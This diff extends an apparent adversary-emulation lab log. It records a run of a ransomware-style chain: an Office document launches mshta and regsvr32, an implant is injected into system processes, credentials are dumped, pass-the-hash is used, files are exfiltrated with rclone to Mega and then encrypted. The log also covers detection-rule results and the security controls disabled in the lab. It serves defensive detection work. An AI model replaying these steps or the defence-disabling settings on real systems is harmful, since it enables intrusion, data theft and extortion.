@@ -332,3 +332,67 @@ transfer added 32 objects, taking the remote to 100 objects.
 **Comma syntax.** `rundll32 <dll>,DllRegisterServer` works when the loader is started directly, but
 `wmic /node:FS01 process call create "rundll32 ... ,DllRegisterServer"` returns `9`
 (`Invalid arguments`) on this build. The pivot therefore keeps the space-separated form.
+
+## Clean run (2026-10-25, evening)
+
+State was reset first: services removed, staged files deleted, the corpus restored, both hosts rebooted.
+The run then went from the document to impact without manual repair.
+
+| Step | Result |
+|---|---|
+| Document opened by `duc.user` | `WINWORD.EXE` starts `cmd.exe /c mshta`, the HTA downloads the implant, `regsvr32` loads it |
+| Entry beacon | session in `regsvr32.exe`, user `duc.user` |
+| Service host loader | `svchost.exe -k c0015grp -p` -> `rundll32.exe C:\Users\Public\compareForfor.jpg,DllRegisterServer`, user `WS01$` |
+| Per-user service host | injector into `svchost.exe -k UnistackSvcGroup` (1984), session user `duc.user` |
+| Logon process | injector into `winlogon.exe` (2672), user `WS01$` |
+| Discovery | `whoami` returns `nt authority\system`, `nltest` and `tasklist /s FS01` run |
+| WMI pivot | `ReturnValue 0`, `ProcessId 332`; on FS01 `rundll32.exe` with parent `WmiPrvSE.exe` |
+| RDP to FS01 | `bk.admin` session on `rdp-tcp#0`, `CDPUserSvc` host appears, `taskmgr /4` from `explorer.exe` |
+| Credential dump | `mk.exe` from the `rundll32.exe` session returns the `bk.admin` NT hash |
+| Pass-the-hash | `pth.bat` creates `C:\ProgramData\pth.txt` on FS01 as `bk.admin` |
+| Service host on FS01 | injector into `svchost.exe -k UnistackSvcGroup` (4184), session user `bk.admin` |
+| Exfiltration | `rclone ... "\\FS01\Shares" Mega:DATA` from the `duc.user` beacon, remote grew from 100 to 125 objects |
+| Impact | five `readme.txt`, forty files renamed to `.c0015` |
+
+### What fired in this run
+
+Alerts from the current rule set, forty-five minute window:
+
+| Rule | Alerts |
+|---|---|
+| loader loads unsigned module | 12 |
+| wmi remote creation | 10 |
+| lsass credential access | 7 |
+| rdp interactive logon | 6 |
+| injection into system process | 4 |
+| office spawns script host | 3 |
+| script host starts loader | 3 |
+| service host starts loader | 3 |
+| cloud transfer | 2 |
+| task manager from shell | 2 |
+| wmi hosted loader | 2 |
+
+The entry chain, the injection, the pivot, the credential access, the interactive session and the
+transfer are all covered. Two rules produced nothing in the window: the pass-the-hash sequence, whose
+two events did not pair inside a minute, and the ransom-note rule, which had not been evaluated by the
+engine before the window closed.
+
+## Lab configuration changes
+
+Everything below exists so the chain can run on this hardware. None of it is part of the campaign.
+
+| Where | Change | Why |
+|---|---|---|
+| WS01 | UAC disabled (`EnableLUA=0`) | the victim process must start the loader without a consent prompt |
+| WS01 | `duc.user` added to Remote Desktop Users | the interactive session is part of the chain and hosts the per-user services |
+| WS01, FS01 | RDP enabled, `TermService` automatic, firewall group on | the campaign reaches the backup server interactively |
+| FS01 | `RDP-Tcp`: `UserAuthentication=0`, `SecurityLayer=2` | the client cannot reach a KDC through the tunnel, so the server accepts TLS with NTLM |
+| FS01 | `bk.admin` password set to a known weak value, PasswordNeverExpires | credential theft and pass-the-hash need a real credential in LSASS |
+| FS01 | Defender real-time monitoring off, exclusions for tool directories | the dump tool is otherwise quarantined |
+| FS01 | ASR rule `d1e49aac-...` (block process creation from WMI) disabled | it blocked the dump when started from the WMI-created loader |
+| FS01 | `LocalAccountTokenFilterPolicy=1` | a local account must be able to use its full token remotely |
+| FS01 | share `Shares` readable by `duc.user` and Authenticated Users | the transfer reads the share from another host |
+| DC01 | DNS zones for the four campaign names | the loader resolves the staging and C2 names inside the lab |
+| FS01 | NRPT for the MEGA names, hosts entry for the API | the lab resolver does not carry public names |
+| Kali | HTTP on 80 for the implant, Sliver listener on 443, SOCKS for the pivot | staging and C2 |
+| WS01, FS01 | Sysmon profile with `E7` on staging paths, `E10` on winlogon and lsass, `E8`, `E22` | telemetry the rules depend on |
